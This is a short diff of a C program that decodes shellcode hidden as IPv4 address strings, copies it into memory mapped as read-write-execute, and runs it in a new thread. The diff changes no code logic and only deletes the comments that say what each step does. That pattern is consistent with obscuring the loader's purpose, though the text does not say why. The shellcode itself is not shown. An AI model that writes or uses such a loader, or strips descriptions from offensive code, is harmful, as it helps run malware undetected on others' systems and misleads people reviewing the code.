@@ -6,7 +6,6 @@
 #include <arpa/inet.h>
 #include <pthread.h>
 
-// IPv4 to binary decoder for Linux
 int decode_ipv4_fuscation(const char* ipv4[], unsigned char* output, int count) {
     struct in_addr addr;
     int offset = 0;
@@ -41,7 +40,7 @@ int main() {
         return -1;
     }
 
-    // Allocate executable memory
+    
     exec_mem = mmap(NULL, SHELLCODE_SIZE,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
@@ -54,7 +53,7 @@ int main() {
     memcpy(exec_mem, shellcode, SHELLCODE_SIZE);
     printf("[+] Shellcode at: %p\n", exec_mem);
 
-    // Execute in thread
+    
     pthread_create(&thread, NULL, (void*(*)(void*))exec_mem, NULL);
     printf("[+] Press Enter to exit...\n");
     getchar();
